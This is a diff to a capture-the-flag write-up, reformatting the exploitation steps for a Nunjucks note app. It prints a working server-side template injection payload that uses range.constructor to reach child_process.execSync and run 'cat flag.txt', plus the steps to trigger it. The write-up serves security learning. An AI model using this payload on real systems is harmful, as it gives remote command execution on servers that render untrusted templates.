@@ -68,7 +68,12 @@ Quick google search about vulnaribility of `nunjucks` shows a great post by Emil
 2. Go to `/supersecret`
 3. Create note
 	* Title: Anything
-	* Content: ::: raw `{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat flag.txt')")()}}` :::
+	* Content: 
+  ::: raw 
+  ```html
+  {{range.constructor("return global.process.mainModule.require('child_process').execSync('cat flag.txt')")()}}` 
+  ```
+  :::
 4. Go back to `/supersecret` and Refresh.
 5. See note contents
 6. Profit
